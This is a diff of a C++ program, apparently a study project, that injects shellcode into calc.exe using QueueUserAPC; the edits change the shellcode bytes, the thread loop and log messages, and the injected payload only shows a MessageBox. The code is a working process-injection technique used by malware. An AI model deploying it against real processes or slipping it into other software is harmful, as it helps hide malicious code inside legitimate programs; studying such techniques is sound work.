@@ -1,3 +1,4 @@
+//                  APC - PROCESS INJECTION METHOD
 /* Method of injecting payload using QueueUserAPC() function */
 /* Purpose:
             Inject 'payload/asmCallMsg.asm' to calc.exe process
@@ -16,7 +17,7 @@
 using namespace std;
 
 byte executer[] = {
-"\x55\x89\xE5\x83\xEC\x08\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x50\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x58\x89\xEC\x5D\xC3"
+"\x55\x89\xE5\x83\xEC\x08\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x50\x53\x51\x52\x57\x56\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x5E\x5F\x5A\x59\x5B\x58\x31\xC0\x89\xEC\x5D\xC3"
 };
 
 bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
@@ -75,10 +76,10 @@ void main()
 			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
 			return ;
 		}else{cout<<"[+] write to process success"<<endl;}
-		// cout<<"[+] Sleeping for 5s"<<endl;
-		// Sleep(5000);
+		cout<<"[+] Sleeping for 15s"<<endl;
+		Sleep(5000);
 
-		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<4; i++) {
+		for(vector<DWORD>::size_type i = 2; i != tids.size(); i++) {
 			DWORD tid = tids[i];
 			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
 			cout<<endl;
@@ -92,7 +93,7 @@ void main()
 				cout<<"[!] failed to get MessageBox addr! error: "<<GetLastError()<<endl;
 				return;
 			}
-			cout<<"MessageBox addr: 0x"<<hex<<messageBoxAddr<<dec<<endl;
+			cout<<"[i] MessageBox addr: 0x"<<hex<<messageBoxAddr<<dec<<endl;
 			if (hThread!=NULL) {
 				if(::QueueUserAPC(
 					(PAPCFUNC)p,
@@ -108,6 +109,7 @@ void main()
 				cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
 				return;
 			}
+            break;
 		}
 		::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
 		cout<<"[+] VirtualFreeEx"<<endl;
